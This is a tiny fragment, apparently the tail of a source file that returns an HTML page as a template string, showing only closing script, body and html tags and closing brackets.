  </script>
</body>

</html>
`)
}
